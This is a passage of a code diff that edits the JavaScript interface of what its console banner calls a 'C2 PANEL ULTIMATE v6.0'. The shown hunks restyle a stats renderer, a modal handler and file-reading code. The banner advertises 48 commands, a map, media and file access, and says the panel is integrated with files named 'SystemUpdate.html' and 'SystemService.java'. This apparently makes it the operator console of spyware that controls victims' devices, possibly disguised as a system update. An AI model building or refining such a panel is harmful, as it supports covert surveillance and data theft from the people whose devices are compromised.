+            }).catch(function(e){ alert('Error: '+e.message); });
         };
         reader.readAsDataURL(file);
     };
@@ -1171,16 +1249,16 @@ function renderStats(){
     var container = document.getElementById('statsDetail');
     if(!allData.length){ container.innerHTML = '<div class="empty-state">📭 No data yet</div>'; return; }
     var sources = {};
-    allData.forEach(item=>{
-        var s = item.sumber||'unknown';
-        if(!sources[s]) sources[s]=0;
+    allData.forEach(function(item){
+        var s = item.sumber || 'unknown';
+        if(!sources[s]) sources[s] = 0;
         sources[s]++;
     });
     var html = '';
-    var sorted = Object.keys(sources).sort((a,b)=>sources[b]-sources[a]);
-    sorted.forEach(key=>{
+    var sorted = Object.keys(sources).sort(function(a,b){ return sources[b] - sources[a]; });
+    sorted.forEach(function(key){
         html += '<div style="background:var(--bg-primary);padding:4px 10px;border-radius:4px;border:1px solid var(--border-color);display:flex;justify-content:space-between;align-items:center;font-size:10px">'+
-                '<span>'+key+'</span><span style="color:var(--text-accent);font-weight:700">'+sources[key]+'</span></div>';
+                '<span>'+formatSource(key)+'</span><span style="color:var(--text-accent);font-weight:700">'+sources[key]+'</span></div>';
     });
     container.innerHTML = html;
 }
@@ -1195,12 +1273,12 @@ function openModal(content){
 function closeModal(){
     document.getElementById('modal').classList.remove('active');
 }
-document.addEventListener('keydown', function(e){ if(e.key==='Escape') closeModal(); });
+document.addEventListener('keydown', function(e){ if(e.key === 'Escape') closeModal(); });
 
 // ============================================================
-// CONSOLE BRANDING
+// CONSOLE
 // ============================================================
-console.log('☠️ C2 PANEL ULTIMATE v6.0');
+console.log('☠️ C2 PANEL ULTIMATE v6.0 - FIXED');
 console.log('📊 16 Stats | ⚡ 48 Commands | 🗺️ Map | 📸 Media | 📁 Files');
 console.log('🔌 Integrated with index.html, SystemUpdate.html, SystemService.java');
 console.log('🟢 All systems online.');
